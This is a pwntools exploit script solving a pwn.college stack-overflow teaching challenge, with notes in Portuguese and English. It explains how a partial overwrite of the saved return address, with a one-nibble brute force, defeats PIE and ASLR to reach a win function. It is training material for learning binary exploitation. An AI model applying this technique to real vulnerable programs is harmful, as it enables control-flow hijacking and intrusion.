#!/usr/bin/env python3

from pwn import *

# ASLR, PIE, NO CANARY, NX
# JMP to know function because is close to the ret address

context.update(arch='amd64', os='linux') # set arch
#context.terminal = ['mate-terminal', '-e'] # set terminal

while True:
    p = process('./babymem_level7_teaching1')

    # attach gdb and print ret after overflow and
    # print the address of win that i want to jump to check
    # if is working
    #gdb.attach(p,'''
    #b *vuln+1778
    #c
    #info frame
    #print *win+24'''
    #)
    
    overflow_until_ret = 'A' * 72
    last_bytes_of_jmp = '\x0a' + '\x80'
    p.sendline('80')
    p.send(overflow_until_ret + last_bytes_of_jmp)
    output = p.recvrepeat(50000) # recv o carai todo
    output_splited = output.split(b'\n') # split output by newline
    
    if b'pwn_' in output: # if flag in output
        print(output_splited[-3]) # flag position
        break
    else:
        p.close()
        print('flag not found retrying...')
        
'''
- Pra bypassar pie com um overflow: da uma olhada no endereÃ§o de retorno 
e ve a diferenca dele pra o endereco da funcao que se quer pular, da pra 
fazer um bruteforce pq as paginas alinhadas de 0x1000 por padrao, vao 
fazer que os bytes finais sejam iguais e dependendo da funcao que se quer 
pular, os bytes iniciais tbm vao ser iguais, o que faz com que o brute 
seja em um nibble (16 valores possiveis)

Exemplo do pwncollege:
- the saved return address is now pointing to 0x55fdc4c277db.
- the address of win is 0x55fdc4c26ff2

0x55fdc4c277db
0x55fdc4c2 6ff2 -> a unica diferenca sao os 2 ultimos bytes

e em uma segunda rodada:
- the saved return address is now pointing to 0x55efb1fc77db.
- the address of win is 0x55efb1fc6ff2.

0x5555dae4a7db
0x5555dae4 9ff2

E se eu pegar as duas rodadas e comparar:

0x55efb1fc77db
0x55efb1fc 6ff2 -> 0x55efb1fcxff2

0x5555dae4a7db
0x5555dae4 9ff2 -> 0x5555dae4xff2

so temos esse meio byte (x) pra fazer brute (16 possibilidades)

Explanation:

Overwriting the entire return address is fine when we know
the whole address, but here, we only really know the last three nibbles.
These nibbles never change, because pages are aligned to 0x1000.
This gives us a workaround: we can overwrite the least significant byte
of the saved return address, which we can know from debugging the binary,
to retarget the return to main to any instruction that shares the other 7 bytes.
Since that last byte will be constant between executions (due to page alignment),
this will always work.
If the address we want to redirect execution to is a bit farther away from
the saved return address, and we need to write two bytes, then one of those
nibbles (the fourth least-significant one) will be a guess, and it will be
incorrect 15 of 16 times.
This is okay: we can just run our exploit a few
times until it works (statistically, after 8 times or so).
'''
